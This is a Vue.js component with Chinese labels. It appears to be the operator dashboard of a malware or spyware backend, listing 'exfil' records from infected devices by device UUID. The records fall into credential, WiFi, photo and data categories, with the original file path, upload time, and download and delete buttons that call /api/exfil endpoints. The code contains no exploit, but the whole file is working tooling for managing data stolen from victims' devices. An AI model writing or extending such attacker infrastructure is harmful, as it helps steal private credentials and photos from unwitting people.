<template>
  <div class="exfil">
    <el-card>
      <div class="search-bar">
        <el-input v-model="filters.device_uuid" placeholder="设备UUID" style="width: 250px;" />
        <el-select v-model="filters.category" placeholder="数据类别">
          <el-option label="全部" value="" />
          <el-option label="凭证" value="credential" />
          <el-option label="WiFi" value="wifi" />
          <el-option label="照片" value="photo" />
          <el-option label="数据" value="data" />
        </el-select>
        <el-button type="primary" @click="loadExfil">查询</el-button>
        <el-button @click="resetFilters">重置</el-button>
      </div>
      
      <el-table :data="exfilData" border v-loading="loading">
        <el-table-column prop="id" label="ID" width="80" />
        <el-table-column prop="device_uuid" label="设备UUID" width="250" />
        <el-table-column prop="category" label="类别" width="120">
          <template #default="scope">
            <el-tag :type="getCategoryType(scope.row.category)">
              {{ getCategoryName(scope.row.category) }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="path" label="原始路径" />
        <el-table-column prop="description" label="描述" />
        <el-table-column prop="file_size" label="大小" width="100" />
        <el-table-column prop="uploaded_at" label="上传时间" width="180" />
        <el-table-column label="操作" width="150">
          <template #default="scope">
            <el-button size="small" @click="downloadExfil(scope.row.id)">下载</el-button>
            <el-button size="small" type="danger" @click="deleteExfil(scope.row.id)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>
      
      <el-pagination
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>
  </div>
</template>

<script setup>
import { ref, reactive } from 'vue'
import axios from '../utils/axios'

const exfilData = ref([])
const loading = ref(false)

const filters = reactive({
  device_uuid: '',
  category: ''
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

function getCategoryType(category) {
  const types = {
    'credential': 'danger',
    'wifi': 'warning',
    'photo': 'success',
    'data': 'info'
  }
  return types[category] || 'info'
}

function getCategoryName(category) {
  const names = {
    'credential': '凭证',
    'wifi': 'WiFi',
    'photo': '照片',
    'data': '数据'
  }
  return names[category] || category
}

async function loadExfil() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', (pagination.page - 1) * pagination.size)
    params.append('limit', pagination.size)
    if (filters.device_uuid) params.append('device_uuid', filters.device_uuid)
    if (filters.category) params.append('category', filters.category)
    
    const response = await axios.get(`/api/exfil?${params}`)
    exfilData.value = response.data
  } catch (error) {
    console.error('加载数据失败:', error)
  } finally {
    loading.value = false
  }
}

async function downloadExfil(id) {
  try {
    const response = await axios.get(`/api/exfil/${id}/download`, { responseType: 'blob' })
    const url = window.URL.createObjectURL(new Blob([response.data]))
    const link = document.createElement('a')
    link.href = url
    link.setAttribute('download', `exfil_${id}.bin`)
    document.body.appendChild(link)
    link.click()
    link.remove()
  } catch (error) {
    console.error('下载文件失败:', error)
  }
}

async function deleteExfil(id) {
  if (!confirm('确定要删除这条数据吗？')) return
  try {
    await axios.delete(`/api/exfil/${id}`)
    loadExfil()
  } catch (error) {
    console.error('删除数据失败:', error)
  }
}

function resetFilters() {
  filters.device_uuid = ''
  filters.category = ''
  loadExfil()
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadExfil()
}

function handleCurrentChange(page) {
  pagination.page = page
  loadExfil()
}

loadExfil()
</script>

<style scoped>
.search-bar {
  display: flex;
  gap: 10px;
  margin-bottom: 20px;
  flex-wrap: wrap;
}
</style>
